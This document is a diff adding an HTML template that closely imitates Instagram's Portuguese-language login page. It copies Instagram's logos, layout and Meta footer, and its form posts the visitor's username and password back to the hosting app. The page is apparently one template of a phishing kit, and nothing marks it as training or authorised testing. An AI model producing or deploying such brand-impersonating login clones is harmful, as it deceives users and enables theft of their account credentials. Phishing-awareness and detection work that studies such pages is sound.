@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Instagram</title>
+  <link rel="stylesheet" href="/static/instagram/instagram.css">
+  <link rel="icon" type="image/png" href="/static/instagram/favicon.png">
+</head>
+<body>
+  <div class="container">
+    <div class="left">
+      <img src="/static/instagram/instagram-preview.png" alt="Instagram Preview">
+    </div>
+    <div class="right">
+        <form method="POST" action="{{ request.path }}">
+            <div class="logo">
+                <img src="/static/instagram/instagram-logo.png" alt="Instagram Logo">
+            </div>
+            <input type="text" name="username" placeholder="Telefone, nome de usuário ou email" required>
+            <input type="password" name="password" placeholder="Senha" required>
+            <button type="submit">Entrar</button>
+            <div class="divider">OU</div>
+            <a class="facebook" href="#">Entrar com o Facebook</a>
+            <a class="forgot" href="#">Esqueceu a senha?</a>
+        </form>
+        <div class="signup">
+            <span>Não tem uma conta?</span> <a href="#">Cadastre-se</a>
+        </div>
+        <div class="app-links">
+            <span>Obtenha o aplicativo.</span>
+            <div class="store-badges">
+            <a href="#"><img src="/static/instagram/google-play.png" alt="Google Play"></a>
+            <a href="#"><img src="/static/instagram/app-store.png" alt="App Store"></a>
+            </div>
+        </div>
+    </div>
+  </div>
+</body>
+<footer>
+    <div class="footer">
+        <a href="#">Meta</a>
+        <a href="#">Sobre</a>
+        <a href="#">Blog</a>
+        <a href="#">Carreiras</a>
+        <a href="#">Ajuda</a>
+        <a href="#">API</a>
+        <a href="#">Privacidade</a>
+        <a href="#">Termos</a>
+        <a href="#">Localizações</a>
+        <a href="#">Instagram Lite</a>
+        <a href="#">Threads</a>
+        <a href="#">Uploads de contato e não de usuários</a>
+        <a href="#">Meta Verified</a>
+    </div>
+</footer>
+</html>
+
